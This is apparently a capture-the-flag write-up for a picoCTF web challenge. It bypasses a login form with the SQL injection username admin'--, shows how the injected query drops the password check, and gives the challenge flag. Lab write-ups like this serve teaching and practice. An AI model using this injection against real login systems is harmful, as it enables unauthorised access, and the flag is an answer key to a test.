# Irish-Mame-Repo 2 - 350 points
Web_Exploitation

## Description:
> There is a website running at https://2019shell1.picoctf.com/problem/60775/. Someone has bypassed the login before, and now it's being strengthened. Try to see if you can still login!

## Hint:
> The password is being filtered.

## Solving:

The page seems to be almost identical to Irish-Name-Repo 1, except that using a simple SQL attack brings up a page with 'SQLi detected'. Using the hint that the password is santised and some educated guessing that the username would be something like 'admin' we can try to comment out the password by using
```c
admin'--
```
This debugs to:
```c
SELECT * FROM users WHERE name='admin'--' AND password=' '
### Flag: 

```c
picoCTF{m0R3_SQL_plz_015815e2}
```
